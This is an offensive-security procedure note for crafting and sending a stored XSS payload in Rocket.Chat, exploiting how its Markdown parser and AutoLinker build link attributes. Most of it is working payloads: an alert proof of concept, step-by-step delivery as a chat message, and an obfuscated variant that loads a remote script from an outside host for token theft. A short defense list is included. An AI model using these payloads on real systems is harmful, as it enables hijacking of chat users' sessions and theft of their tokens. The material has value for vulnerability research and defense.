---
tags:
  - xss
  - payload-craft
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/rocket-chat-xss-payload-alert]]'
  - '[[commands/rocket-chat-xss-payload-external-script]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:33:24.259Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 818e571c-b3d8-41de-8218-6a4e77725cfb
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-and-Send-Malicious-XSS-Payload

## Summary

This procedure crafts a stored XSS payload exploiting the interaction between Rocket.Chat's Markdown parser (handling inline-code and URLs) and AutoLinker, allowing attribute injection in rendered <a> tags to execute JavaScript when a victim views the message.

## Description

The vulnerability arises from insufficient sanitization during parsing: Markdown processes `[ ]` for inline-code and URLs, but AutoLinker then wraps content in <a> tags without proper escaping. This enables breaking out of the href attribute to inject style and event handlers like onanimationiteration, which triggers JS via CSS animations and prototype overrides (e.g., Array.prototype[Symbol.hasInstance]). The payload is sent as a chat message, stored server-side, and executes in the victim's browser context upon rendering. Prerequisites include a valid Rocket.Chat user account with send permissions in a shared channel.

## Requirements

1. Access to Rocket.Chat web interface with messaging privileges
2. Knowledge of victim's channel for targeting
3. Browser for payload testing (e.g., dev tools to simulate rendering)

## Defense

Defensive measures and detection strategies:

- Implement strict URL validation in markdown.js to reject tokens like `[`, `]` in URLs
- Use Content Security Policy (CSP) to block inline JS and eval
- Sanitize all attributes post-parsing with libraries like DOMPurify
- Monitor for anomalous JS execution in browser logs or WAF rules for payload patterns

## Objectives

1. Deliver a persistent XSS payload via chat message
2. Ensure payload evades initial sanitization
3. Set up for token theft on execution

## Instructions

### Step 1: Craft the Base Payload

**Context**: Build the payload using Markdown inline-code to embed disruptive tokens, followed by URL and attribute injection.

**Command** ([[commands/rocket-chat-xss-payload-alert]]):
```javascript
https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[] target=_blank data-x=`.")
```

> This payload tricks parsing: Markdown sees `[ ]` around the inner URL, AutoLinker creates <a href="https:// style=...">, breaking out to inject onanimationiteration which overrides instanceof to eval the alert.

### Step 2: Send the Payload as Chat Message

**Context**: Paste the crafted payload into the chat input and send to a channel.

**Command** (Direct chat input):
```javascript
// Enter in Rocket.Chat chat box and send
https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[] target=_blank data-x=`.")
```

> Expected: Message sends successfully, appears as a link in chat history.

### Step 3: Test with External Script Load (Optional)

**Context**: Variant for loading remote JS to exfiltrate data.

**Command** ([[commands/rocket-chat-xss-payload-external-script]]):
```javascript
https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\x28\x27script\x27\x29;s.src=\x27\x68\x74\x74\x70\x73\x3a\x2f\x2fsectex.dev\x2ffiles\x2fcswsh.js\x27;document.body.appendChild\x28s\x29;'instanceof[] target=_blank data-x=`.")
```

> Loads https://sectex.dev/files/cswsh.js which can handle token theft.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/rocket-chat-xss-payload-alert]]
- [[commands/rocket-chat-xss-payload-external-script]]

## Tools Used


## Tags

- xss
- payload-craft
